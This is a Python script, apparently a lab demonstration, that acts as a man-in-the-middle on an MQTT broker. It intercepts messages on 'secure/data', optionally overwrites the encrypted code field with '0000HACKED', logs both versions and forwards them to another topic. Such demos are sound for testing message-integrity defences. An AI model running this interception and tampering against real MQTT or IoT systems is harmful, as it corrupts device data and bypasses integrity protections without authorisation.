import paho.mqtt.client as mqtt
import json
import base64
import datetime
import os
import hashlib

def get_windows_host_ip():
    with open("/etc/resolv.conf", "r") as f:
        for line in f:
            if "nameserver" in line:
                return line.strip().split()[1]

os.makedirs("mitmlogs", exist_ok=True)

def log_to_file(original, modified=None):
    with open("mitmlogs/mitm_log.json", "a", encoding="utf-8") as f:
        entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "original": original
        }
        if modified:
            entry["modified"] = modified
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")

def on_message(client, userdata, msg):
    payload = json.loads(msg.payload.decode())
    packet_id = payload.get("uuid", "(未附UUID)")
    print(f"[MITM 攔截 UUID={packet_id}] 原始封包:", json.dumps(payload, ensure_ascii=False))

    tamper = input("是否竄改代碼? (y/n): ")
    modified = None
    if tamper.lower() == 'y':
        original_code = payload['code']['ciphertext']
        payload['code']['ciphertext'] = base64.b64encode(b"0000HACKED").decode()
        print("將封包 code.ciphertext 從", original_code, "改為", payload['code']['ciphertext'])
        modified = payload

    log_to_file(original=msg.payload.decode(), modified=modified)
    mitm.publish("forward/data", json.dumps(payload))

mitm = mqtt.Client()
mitm.on_message = on_message
mitm.connect(get_windows_host_ip(), 1883, 60)
mitm.subscribe("secure/data")
print("MITM 正在攔截資料...")
mitm.loop_forever()